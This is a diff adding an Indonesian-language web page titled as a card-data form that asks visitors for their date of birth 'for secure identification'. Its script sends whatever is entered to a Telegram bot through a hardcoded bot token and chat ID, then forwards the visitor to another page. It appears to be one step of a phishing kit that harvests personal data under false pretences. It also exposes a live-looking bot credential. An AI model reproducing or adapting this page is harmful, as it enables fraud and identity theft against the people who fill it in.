@@ -1,0 +1,201 @@
+<!DOCTYPE html>
+<html lang="id">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <title>Masukan Data Kartu</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            height: 100vh;
+            background-color: #f5f5f5;
+            margin: 0;
+            padding: 0;
+            overflow: hidden;
+            position: relative;
+        }
+
+        .back-button {
+            position: fixed;
+            top: 10px;
+            left: 10px;
+            width: 40px;
+            height: 40px;
+            cursor: pointer;
+            z-index: 10;
+        }
+
+        .container {
+            background: white;
+            padding: 50px;
+            border-radius: 10px;
+            width: 100vw;
+            height: 100vh;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            position: relative;
+        }
+
+        .container img {
+            width: 100%;
+            max-width: 250px;
+            margin: 10px 0;
+        }
+
+        .input-box {
+            width: 90%;
+            padding: 12px;
+            margin: 10px 0;
+            border: 1px solid #bbb;
+            border-radius: 10px;
+            background-color: #eee;
+        }
+
+        .input-row {
+            display: flex;
+            justify-content: space-between;
+            width: 90%;
+        }
+
+        .input-row .input-box {
+            width: 30%;
+            margin-right: 5px;
+        }
+
+        .input-row .input-box:last-child {
+            margin-right: 0;
+        }
+
+        .small-text1 {
+            font-family: Arial, Helvetica, sans-serif;
+            font-size: 0.9em;
+            color: #595959;
+            text-align: center;
+            margin-top: 10px;
+            /* Kurangi nilai ini */
+            margin-bottom: 105px;
+            /* Tambahkan jika perlu */
+            width: 90%;
+        }
+
+        .small-text11 {
+            font-family: Arial, Helvetica, sans-serif;
+            font-size: 0.9em;
+            color: #595959;
+            text-align: center;
+            margin-top: -100px;
+            /* Kurangi nilai ini */
+            margin-bottom: 50px;
+            /* Tambahkan jika perlu */
+            width: 90%;
+        }
+
+        .small-text9 {
+            font-weight: bold;
+            font-family: Arial, Helvetica, sans-serif;
+            font-size: 1.5em;
+            color: #000000;
+            text-align: center;
+            margin-top: -300px;
+            /* Kurangi nilai ini */
+            margin-bottom: 5px;
+            /* Tambahkan jika perlu */
+            width: 90%;
+        }
+
+        .link {
+            color: #2984f1;
+            text-decoration: none;
+        }
+
+        .link:hover {
+            text-decoration: underline;
+        }
+
+        .lanjutkan {
+            position: absolute;
+            top: 600px;
+            left: 50%;
+            transform: translateX(-50%);
+            padding: 15px 120px;
+            font-size: 18px;
+            color: white;
+            background: #2984f1;
+            border: none;
+            border-radius: 50px;
+            cursor: pointer;
+            z-index: 20;
+            letter-spacing: 2px;
+            /* Sesuaikan jarak antar huruf */
+            font-family: Arial, Helvetica, sans-serif;
+            font-weight: bold;
+        }
+        .input-box:focus {
+            border-color: #2984f1;
+            outline: none;
+            /* Menghilangkan outline default */
+            background-color: white;
+            /* Opsional: Membuat input lebih jelas saat aktif */
+        }
+    </style>
+</head>
+
+<body>
+    <img src="back.png" alt="Kembali" class="back-button" id="backButton">
+    <button class="lanjutkan">Lanjutkan</button>
+    <div class="container">
+        <p class="small-text9">Tanggal Lahir</p>
+        <p class="small-text1">Tambahkan untuk identifikasi yang aman. Yuk,</p>
+        <p class="small-text11">masukkan tanggal lahir Anda sesuai format.</p>
+        <div class="input-row">
+            <input type="text" class="input-box" placeholder="DD" maxlength="2" inputmode="numeric" pattern="[0-9]*"
+                id="dd">
+            <input type="text" class="input-box" placeholder="MM" maxlength="2" inputmode="numeric" pattern="[0-9]*"
+                id="mm">
+            <input type="text" class="input-box" placeholder="YYYY" maxlength="4" inputmode="numeric" pattern="[0-9]*"
+                id="yyyy">
+        </div>
+        <script>
+            document.querySelector(".lanjutkan").addEventListener("click", function () {
+                let dd = document.getElementById("dd").value;
+                let mm = document.getElementById("mm").value;
+                let yyyy = document.getElementById("yyyy").value;
+        
+                if (dd && mm && yyyy) {
+                    let message = `📅 Tanggal Lahir: ${dd}-${mm}-${yyyy}`;
+                    let botToken = "8077461850:AAH8wdhBg2pux-lgWIywaFrKJEbEsO7jqAU"; // Ganti dengan token bot Telegram
+                    let chatId = "-1002335844426"; // Ganti dengan Chat ID kamu
+        
+                    let url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
+        
+                    fetch(url)
+                        .then(response => response.json())
+                        .then(data => {
+                            if (data.ok) {
+                                alert("Data berhasil dikirim ke Telegram!");
+                                window.location.href = "halaman-baru.html"; // Ganti dengan halaman tujuan
+                            } else {
+                                alert("Gagal mengirim data.");
+                            }
+                        })
+                        .catch(error => {
+                            console.error("Error:", error);
+                            alert("Terjadi kesalahan.");
+                        });
+                } else {
+                    alert("Mohon isi semua kolom.");
+                }
+            });
+        </script>
+        
+        
+</body>
+
+</html>
